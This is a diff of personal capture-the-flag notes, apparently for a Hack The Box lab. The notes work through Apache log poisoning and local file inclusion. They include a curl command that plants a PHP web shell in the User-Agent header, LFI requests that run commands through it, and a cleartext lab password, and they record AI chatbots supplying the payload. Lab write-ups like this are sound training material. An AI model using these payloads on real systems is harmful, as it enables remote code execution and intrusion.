@@ -129,11 +129,11 @@ so, also, for some reason, guided mode wants me to look at apache logs.
 
     http://$HTBIP/browse.php?file=X
 
-10.129.1.254
 
 ffuf? nah. lets just try a few dirs.
 it depends on the os. wait. we already have user shell.
 
+    export HTBIP=10.129.1.254
     ssh -o PubkeyAuthentication=no charix@$HTBIP
 
 
@@ -187,8 +187,78 @@ WAIIIIT...the hint says `poison the access log with...`. This means I need to be
 
 I need to send HTTP traffic that includes a webshell, that causes the apache process to spit PHP code into `/var/log/httpd-access.log`.
 
+So. What causes apache to log requests, and what part of the request is logged?
+I'm going to try to `cat /var/log/httpd-access.log` in an ssh session.
+
 After I poison the log, I can trigger the victim to execute the web shell by running this code from the attacker machine:
 
     curl -vvvk http://$HTBIP/browse.php?file=/var/log/httpd-access.log
 
 See [./poison-log.bash](./poison-log.bash)
+
+see httpd-access.log:
+
+okay. it shows GET params. I wonder if it logs POST bodies.
+
+    export HTBIP=10.129.1.254
+    curl -X POST -d 'FILL\n ME\n IN\n WITH\n A\n REV\n SHELL' http://$HTBIP/browse.php?file=/var/log/httpd-access.log
+
+...
+
+In the interest of time, I'm going to "cheat" and just look at...well...
+
+I'm tempted to ask LocalAI what to make of this sheet.
+
+thanks China!
+
+https://chat.z.ai/c/7746e708-8555-4471-ae77-64191e741f01
+
+wow! it's pretty direct. "You are over engineering the zip file. secret.zip is a rabbit hole."
+
+going to use z.ai instead of claude code for a month and see if it changes anything.
+
+no wonder China is beating us, they move faster with less safety and politeness. americans beat submissiveness and people-pleasing into our LLMs. it shows because they just keep praising us for doing simple stuff like "reading and writing text from a console". like. I'm not proud that I'm floundering, I don't need Claude.ai to praise me for being semi bad at hacking...
+
+so...below is some slop from `GLM-4.7`.
+
+```bash
+# This sends a request with PHP code in the User-Agent
+# It gets written to /var/log/httpd-access.log
+export HTBIP=10.129.1.254
+curl -A "<?php system(\$_GET['cmd']); ?>" http://$HTBIP/index.php
+```
+
+yeah, so, claude.ai and z.ai both gave me the same answer, but claude wastes tokens on sycophancy. z.ai is more direct and uses "You are... You need... This is... Go do this..." language.
+
+sweet! the local file inclusion works.
+
+```
+export HTBIP=10.129.1.254
+# Check who we are (should return uid=0(root))
+curl "http://$HTBIP/browse.php?file=/var/log/httpd-access.log&cmd=id"
+# www is our user...
+
+curl "http://$HTBIP/browse.php?file=/var/log/httpd-access.log&cmd=whoami"
+
+# Read the root flag (won't work because we're not root)
+curl "http://$HTBIP/browse.php?file=/var/log/httpd-access.log&cmd=cat%20/root/root.txt"
+```
+
+
+oh, now we're on to pwdbackup.txt, haha....i did this lab out of order...
+
+
+Charix!2#4%6&8(0
+
+who else uses this password...well, i could go through `su USER` and just brute force it...
+
+duh! charix, that user.
+
+oh my god.
+
+the password for the zip file is also Charix!2#4%6&8(0
+...
+
+d'oh!!
+
+yeah. i over engineer stuff. wow!!!!! how do I stop doing this?
